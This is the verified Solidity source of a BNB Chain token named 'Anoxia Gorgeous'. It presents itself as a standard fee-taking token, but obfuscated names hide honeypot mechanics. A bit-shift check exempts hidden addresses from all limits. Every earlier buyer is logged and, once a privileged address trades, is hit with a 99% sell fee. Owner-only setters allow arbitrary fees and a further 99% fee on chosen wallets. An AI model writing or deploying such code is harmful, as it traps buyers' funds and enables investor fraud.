/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract AnoxiaGorgeous is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Anoxia Gorgeous ";
    string constant _symbol = "AnoxiaGorgeous";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private marketingReceiverTradingSellExemptLimitSwap;
    mapping(address => bool) private receiverTradingSwapTeam;
    mapping(address => bool) private exemptBotsSwapSell;
    mapping(address => bool) private launchedSwapTxMin;
    mapping(address => uint256) private minModeLimitBots;
    mapping(uint256 => address) private walletBurnIsAutoSell;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapLiquidityTradingMin = 0;
    uint256 private exemptAutoMaxLiquidity = 9;

    //SELL FEES
    uint256 private limitIsLiquidityLaunchedMaxMarketing = 0;
    uint256 private txTeamTradingLaunched = 9;

    uint256 private feeLimitExemptModeReceiverBotsSell = exemptAutoMaxLiquidity + swapLiquidityTradingMin;
    uint256 private swapLiquidityTeamReceiver = 100;

    address private autoMaxTradingIsBurn = (msg.sender); // auto-liq address
    address private receiverBotsBurnMode = (0xc6fBC8F531d9DD779dF5952cFfFfddb20C222F91); // marketing address
    address private maxTeamExemptMode = DEAD;
    address private buySellMaxLaunchedExemptWalletMin = DEAD;
    address private launchedMaxIsWallet = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private maxSellReceiverSwap;
    uint256 private swapExemptFeeLiquidity;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private launchedMaxLiquidityTeam;
    uint256 private receiverMaxBuyExempt;
    uint256 private launchedBurnMaxExemptMinIsSwap;
    uint256 private sellFeeIsBuy;
    uint256 private sellSwapBurnMin;

    bool private swapTradingMaxLiquidity = true;
    bool private launchedSwapTxMinMode = true;
    bool private sellModeWalletMinFee = true;
    bool private modeIsLiquidityFeeMinMarketingBurn = true;
    bool private sellBuyMaxTxTrading = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private liquiditySwapIsLaunched = _totalSupply / 1000; // 0.1%

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        launchedMaxLiquidityTeam = true;

        marketingReceiverTradingSellExemptLimitSwap[msg.sender] = true;
        marketingReceiverTradingSellExemptLimitSwap[address(this)] = true;

        receiverTradingSwapTeam[msg.sender] = true;
        receiverTradingSwapTeam[0x0000000000000000000000000000000000000000] = true;
        receiverTradingSwapTeam[0x000000000000000000000000000000000000dEaD] = true;
        receiverTradingSwapTeam[address(this)] = true;

        exemptBotsSwapSell[msg.sender] = true;
        exemptBotsSwapSell[0x0000000000000000000000000000000000000000] = true;
        exemptBotsSwapSell[0x000000000000000000000000000000000000dEaD] = true;
        exemptBotsSwapSell[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellSwapAutoTx(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return sellSwapAutoTx(sender, recipient, amount);
    }

    function sellSwapAutoTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = isSellModeMinFeeTrading(sender) || isSellModeMinFeeTrading(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                buyExemptModeAuto();
            }
            if (!bLimitTxWalletValue) {
                burnExemptBotsTradingLaunchedMin(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return tradingModeAutoWalletExemptTeamReceiver(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(swapTradingMaxLiquidity, "Trading is not active");
        }

        if (!Administration[sender] && !marketingReceiverTradingSellExemptLimitSwap[sender] && !marketingReceiverTradingSellExemptLimitSwap[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || exemptBotsSwapSell[sender] || exemptBotsSwapSell[recipient], "Max TX Limit has been triggered");

        if (txLimitBurnBotsMax()) {sellLiquidityMinIs();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = exemptWalletSwapReceiverModeAutoBots(sender) ? sellFeeMinExempt(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function tradingModeAutoWalletExemptTeamReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function exemptWalletSwapReceiverModeAutoBots(address sender) internal view returns (bool) {
        return !receiverTradingSwapTeam[sender];
    }

    function feeTxModeExempt(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            feeLimitExemptModeReceiverBotsSell = txTeamTradingLaunched + limitIsLiquidityLaunchedMaxMarketing;
            return botsModeExemptLimit(sender, feeLimitExemptModeReceiverBotsSell);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeLimitExemptModeReceiverBotsSell = exemptAutoMaxLiquidity + swapLiquidityTradingMin;
            return feeLimitExemptModeReceiverBotsSell;
        }
        return botsModeExemptLimit(sender, feeLimitExemptModeReceiverBotsSell);
    }

    function sellFeeMinExempt(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(feeTxModeExempt(sender, receiver == uniswapV2Pair)).div(swapLiquidityTeamReceiver);

        if (launchedSwapTxMin[sender] || launchedSwapTxMin[receiver]) {
            feeAmount = amount.mul(99).div(swapLiquidityTeamReceiver);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function isSellModeMinFeeTrading(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function botsModeExemptLimit(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = minModeLimitBots[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function burnExemptBotsTradingLaunchedMin(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        walletBurnIsAutoSell[exemptLimitValue] = addr;
    }

    function buyExemptModeAuto() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (minModeLimitBots[walletBurnIsAutoSell[i]] == 0) {
                    minModeLimitBots[walletBurnIsAutoSell[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(receiverBotsBurnMode).transfer(amountBNB * amountPercentage / 100);
    }

    function txLimitBurnBotsMax() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    sellBuyMaxTxTrading &&
    _balances[address(this)] >= liquiditySwapIsLaunched;
    }

    function sellLiquidityMinIs() internal swapping {
        uint256 amountToLiquify = liquiditySwapIsLaunched.mul(swapLiquidityTradingMin).div(feeLimitExemptModeReceiverBotsSell).div(2);
        uint256 amountToSwap = liquiditySwapIsLaunched.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeLimitExemptModeReceiverBotsSell.sub(swapLiquidityTradingMin.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapLiquidityTradingMin).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(exemptAutoMaxLiquidity).div(totalETHFee);

        payable(receiverBotsBurnMode).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoMaxTradingIsBurn,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getReceiverBotsBurnMode() public view returns (address) {
        return receiverBotsBurnMode;
    }
    function setReceiverBotsBurnMode(address a0) public onlyOwner {
        if (receiverBotsBurnMode == launchedMaxIsWallet) {
            launchedMaxIsWallet=a0;
        }
        receiverBotsBurnMode=a0;
    }

    function getTxTeamTradingLaunched() public view returns (uint256) {
        if (txTeamTradingLaunched != exemptAutoMaxLiquidity) {
            return exemptAutoMaxLiquidity;
        }
        if (txTeamTradingLaunched != exemptAutoMaxLiquidity) {
            return exemptAutoMaxLiquidity;
        }
        return txTeamTradingLaunched;
    }
    function setTxTeamTradingLaunched(uint256 a0) public onlyOwner {
        txTeamTradingLaunched=a0;
    }

    function getReceiverTradingSwapTeam(address a0) public view returns (bool) {
        if (a0 != receiverBotsBurnMode) {
            return swapTradingMaxLiquidity;
        }
        if (a0 != autoMaxTradingIsBurn) {
            return sellModeWalletMinFee;
        }
            return receiverTradingSwapTeam[a0];
    }
    function setReceiverTradingSwapTeam(address a0,bool a1) public onlyOwner {
        if (receiverTradingSwapTeam[a0] == receiverTradingSwapTeam[a0]) {
           receiverTradingSwapTeam[a0]=a1;
        }
        if (receiverTradingSwapTeam[a0] == launchedSwapTxMin[a0]) {
           launchedSwapTxMin[a0]=a1;
        }
        receiverTradingSwapTeam[a0]=a1;
    }

    function getLaunchedSwapTxMinMode() public view returns (bool) {
        if (launchedSwapTxMinMode != sellModeWalletMinFee) {
            return sellModeWalletMinFee;
        }
        if (launchedSwapTxMinMode == swapTradingMaxLiquidity) {
            return swapTradingMaxLiquidity;
        }
        return launchedSwapTxMinMode;
    }
    function setLaunchedSwapTxMinMode(bool a0) public onlyOwner {
        if (launchedSwapTxMinMode != modeIsLiquidityFeeMinMarketingBurn) {
            modeIsLiquidityFeeMinMarketingBurn=a0;
        }
        if (launchedSwapTxMinMode == sellModeWalletMinFee) {
            sellModeWalletMinFee=a0;
        }
        if (launchedSwapTxMinMode != launchedSwapTxMinMode) {
            launchedSwapTxMinMode=a0;
        }
        launchedSwapTxMinMode=a0;
    }

    function getMaxTeamExemptMode() public view returns (address) {
        if (maxTeamExemptMode == buySellMaxLaunchedExemptWalletMin) {
            return buySellMaxLaunchedExemptWalletMin;
        }
        if (maxTeamExemptMode != launchedMaxIsWallet) {
            return launchedMaxIsWallet;
        }
        return maxTeamExemptMode;
    }
    function setMaxTeamExemptMode(address a0) public onlyOwner {
        if (maxTeamExemptMode == receiverBotsBurnMode) {
            receiverBotsBurnMode=a0;
        }
        maxTeamExemptMode=a0;
    }

    function getBuySellMaxLaunchedExemptWalletMin() public view returns (address) {
        if (buySellMaxLaunchedExemptWalletMin == launchedMaxIsWallet) {
            return launchedMaxIsWallet;
        }
        if (buySellMaxLaunchedExemptWalletMin == buySellMaxLaunchedExemptWalletMin) {
            return buySellMaxLaunchedExemptWalletMin;
        }
        return buySellMaxLaunchedExemptWalletMin;
    }
    function setBuySellMaxLaunchedExemptWalletMin(address a0) public onlyOwner {
        if (buySellMaxLaunchedExemptWalletMin != maxTeamExemptMode) {
            maxTeamExemptMode=a0;
        }
        buySellMaxLaunchedExemptWalletMin=a0;
    }

    function getSellModeWalletMinFee() public view returns (bool) {
        if (sellModeWalletMinFee == sellBuyMaxTxTrading) {
            return sellBuyMaxTxTrading;
        }
        if (sellModeWalletMinFee != modeIsLiquidityFeeMinMarketingBurn) {
            return modeIsLiquidityFeeMinMarketingBurn;
        }
        return sellModeWalletMinFee;
    }
    function setSellModeWalletMinFee(bool a0) public onlyOwner {
        sellModeWalletMinFee=a0;
    }

    function getExemptBotsSwapSell(address a0) public view returns (bool) {
        if (a0 != buySellMaxLaunchedExemptWalletMin) {
            return swapTradingMaxLiquidity;
        }
        if (exemptBotsSwapSell[a0] != marketingReceiverTradingSellExemptLimitSwap[a0]) {
            return sellModeWalletMinFee;
        }
            return exemptBotsSwapSell[a0];
    }
    function setExemptBotsSwapSell(address a0,bool a1) public onlyOwner {
        if (exemptBotsSwapSell[a0] == marketingReceiverTradingSellExemptLimitSwap[a0]) {
           marketingReceiverTradingSellExemptLimitSwap[a0]=a1;
        }
        if (a0 == maxTeamExemptMode) {
            sellModeWalletMinFee=a1;
        }
        if (exemptBotsSwapSell[a0] != launchedSwapTxMin[a0]) {
           launchedSwapTxMin[a0]=a1;
        }
        exemptBotsSwapSell[a0]=a1;
    }

    function getSwapLiquidityTradingMin() public view returns (uint256) {
        if (swapLiquidityTradingMin == limitIsLiquidityLaunchedMaxMarketing) {
            return limitIsLiquidityLaunchedMaxMarketing;
        }
        return swapLiquidityTradingMin;
    }
    function setSwapLiquidityTradingMin(uint256 a0) public onlyOwner {
        if (swapLiquidityTradingMin == feeLimitExemptModeReceiverBotsSell) {
            feeLimitExemptModeReceiverBotsSell=a0;
        }
        if (swapLiquidityTradingMin == liquiditySwapIsLaunched) {
            liquiditySwapIsLaunched=a0;
        }
        if (swapLiquidityTradingMin == liquiditySwapIsLaunched) {
            liquiditySwapIsLaunched=a0;
        }
        swapLiquidityTradingMin=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}